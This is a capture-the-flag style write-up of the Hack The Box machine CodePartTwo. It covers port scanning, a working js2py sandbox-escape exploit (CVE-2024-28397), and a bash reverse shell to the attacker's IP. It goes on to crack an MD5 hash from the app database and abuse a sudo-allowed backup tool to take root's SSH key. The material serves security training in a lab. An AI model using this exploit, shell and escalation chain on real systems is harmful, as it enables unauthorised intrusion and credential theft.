---
title: CodePartTwo
date: 2026-02-04
logo: /assets/images/codeparttwo/logo.png
categories:
  - Hack The Box
  - Easy
  - Linux
  - js2py RCE
  - RCE
  - Hash Cracking
  - Sudo
---
# CodePartTwo

-------------
## Introduction

This writeup documents the penetration testing of the [**CodePartTwo**](https://app.hackthebox.com/machines/CodePartTwo) machine from the [**Hack The Box**](https://www.hackthebox.com/) platform. In this case, I'll exploit a vulnerable Python library called **js2py** to get a RCE and privesc by abussing a backup script.

---------
## Information Gathering

After identifying the target's IP address and operating system of the machine, we need to enumerate as  much information as possible about the host.

```
❯ nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.129.16.47 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-04 15:12 +0100
Initiating SYN Stealth Scan at 15:12
Scanning 10.129.16.47 [65535 ports]
Discovered open port 22/tcp on 10.129.16.47
Discovered open port 8000/tcp on 10.129.16.47
Completed SYN Stealth Scan at 15:12, 11.58s elapsed (65535 total ports)
Nmap scan report for 10.129.16.47
Host is up, received user-set (0.075s latency).
Scanned at 2026-02-04 15:12:12 CET for 11s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.69 seconds
           Raw packets sent: 65537 (2.884MB) | Rcvd: 65537 (2.621MB)
```

```
❯ nmap -sCV -p22,8000 10.129.16.47 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-04 15:12 +0100
Nmap scan report for 10.129.16.47
Host is up (0.040s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.63 seconds
```

Nmap found 2 open ports. The intrusion is probably going to be, or at least start, from port 8000. You can Google the SSH version followed by “launchpad” to get a good hint about the OS. You can also check the blog’s [Enumeration Cheat Sheet](https://pwnerguy.github.io/enumeration-cheatsheet/), which includes a table mapping service versions to possible OS versions. We are facing an **Ubuntu Focal (20.04)**

We can't do much with the SSH service since we don't have credentials yet, so let's focus on the HTTP port.

```
❯ whatweb http://10.129.16.47:8000
http://10.129.16.47:8000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn/20.0.4], IP[10.129.16.47], Script, Title[Welcome to CodePartTwo]
```

![](/assets/images/codeparttwo/web.png)

There are 3 buttons redirecting to `/login`, `/register` and `/download`. I fuzzed directories but nothing interesting...

```
❯ gobuster dir -u http://10.129.16.47:8000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.16.47:8000
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 200) [Size: 10708]
/login                (Status: 200) [Size: 667]
/register             (Status: 200) [Size: 651]
/logout               (Status: 302) [Size: 189] [--> /]
/dashboard            (Status: 302) [Size: 199] [--> /login]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

When I clicked on the `DOWNLOAD APP` button, it downloaded `app.zip`, containing: 

```
Archive:  app.zip
   creating: app/
   creating: app/static/
   creating: app/static/css/
  inflating: app/static/css/styles.css  
   creating: app/static/js/
  inflating: app/static/js/script.js  
  inflating: app/app.py              
   creating: app/templates/
  inflating: app/templates/dashboard.html  
  inflating: app/templates/reviews.html  
  inflating: app/templates/index.html  
  inflating: app/templates/base.html  
  inflating: app/templates/register.html  
  inflating: app/templates/login.html  
  inflating: app/requirements.txt    
   creating: app/instance/
  inflating: app/instance/users.db  
```

The `requirements.txt` contains the versions of the app's frameworks.

```
❯ cat requirements.txt
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

> **Js2Py** is a Python library that is able to translate and execute virtually any JavaScript code written in pure Python and does not have any dependencies.

In fact, `app.zip` is the whole web compressed in a ZIP file, but I couldn't find more stuff since it's empty. When you register and log in, there is a JS code manager.

![](/assets/images/codeparttwo/js.png)

---------
## Vulnerability Assessment

**CVE-2024-28397** corresponds to the sandbox escape vuln in this Python library. The vuln is docummented in **[this repo](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape?tab=readme-ov-file)**, but I'll make it simple here.  Basically, there's a vulnerability that consists on executing JS code to escape the sandbox of the Python library `js2py` and getting a RCE in the server, so let's try to exploit this vuln.

---------
## Exploitation

I'll execute this code while I'm capturing traffic with Wireshark to perform a quick test.

```js
let cmd = "ping -c 1 10.10.17.188"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

![](/assets/images/codeparttwo/wireshark.png)

The victim machine did ping my machine, so I got a RCE. Now, I'll execute the following command in the server while I'm listening in my machine from the port 4444.

```
bash -i >& /dev/tcp/10.10.17.188/4444 0>&1
```

```
❯ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.188] from (UNKNOWN) [10.129.16.47] 55546
/bin/sh: 0: can't access tty; job control turned off
$ whoami
app
```

---------
## Post-Exploitation

Now I'm in the system as the user `app` and I can try to see again the file `users.db`.

```
app@codeparttwo:~/app/instance$ sqlite3 users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> sqlite3
   ...> ;
Error: near "sqlite3": syntax error
sqlite> .tables
code_snippet  user        
sqlite> SELECT * FROM user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

Let's crack `marco`'s hash and log in as him.

```
❯ john --format=Raw-MD5 -w:/usr/share/wordlists/rockyou.txt hash1
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=5
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetangelbabylove (?)     
1g 0:00:00:00 DONE (2026-02-04 18:17) 2.500g/s 8621Kp/s 8621Kc/s 8621KC/s sweetbabygyal..sweetali786
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

`marco` can run the binary `/usr/local/bin/npbackup-cli` as root without providing credentials.

```
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

The backup path is defined in `npbackup.conf`, which is located in `marco`'s home directory.

![](/assets/images/codeparttwo/backup_path.png)

Using parameters from the `--help` output of the binary, I'll duplicate npbackup.conf so that it's writeable by `marco` and then, edit the backup path to backup the hole `/root` directory.

```
marco@codeparttwo:~$ cp npbackup.conf npbackup_pwn.conf
marco@codeparttwo:~$ ls -l
total 16
drwx------ 7 root  root  4096 Apr  6  2025 backups
-rw-rw-r-- 1 root  root  2893 Jun 18  2025 npbackup.conf
-rw-rw-r-- 1 marco marco 2893 Feb  4 17:45 npbackup_pwn.conf
-rw-r----- 1 root  marco   33 Feb  4 13:19 user.txt
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup_pwn.conf -b
...
2026-02-04 17:50:53,376 :: INFO :: Operation finished
2026-02-04 17:50:53,382 :: INFO :: ExecTime = 0:00:02.214257, finished, state is: errors.
```

Once finised, I listed the files and directories of the backup and thought on using root's private key to access the system via SSH.

```
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup_pwn.conf --ls
...
/root/.ssh/id_rsa
...
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup_pwn.conf --dump /root/.ssh/id_rsa
...
```

```
❯ chmod 600 id_rsa
❯ ssh -i id_rsa root@10.129.16.47
...
root@codeparttwo:~# cat root.txt
***REDACTED***
```








